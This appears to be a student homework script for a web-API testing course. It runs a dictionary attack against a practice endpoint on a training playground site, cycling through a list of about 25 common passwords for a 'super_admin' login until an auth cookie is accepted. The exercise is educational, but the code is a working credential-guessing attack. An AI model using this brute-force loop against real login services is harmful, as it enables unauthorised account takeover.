import requests

get_password_link = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
auth_link = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
payload = {"login": "super_admin", "password": "password"}
password_dictionary = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345",
                       "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin",
                       "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888",
                       "princess", "dragon", "password1", "123qwe"]

cookies = {}

for password in password_dictionary:
    payload.update({'password': password})
    # print(payload)
    response = requests.post(get_password_link, data=payload)
    cookie_value = response.cookies.get('auth_cookie')
    print(f"**************************************")
    print(f"password: {password}")
    print(f"cookie: {cookie_value}")
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    # print(f"this requests cookie: {cookies}")
    response2 = requests.post(auth_link, cookies=cookies)
    if response2.text != "You are NOT authorized":
        print("\033[32m", response2.text)
        print("\033[32m", f"Authorization password: {password}")
        break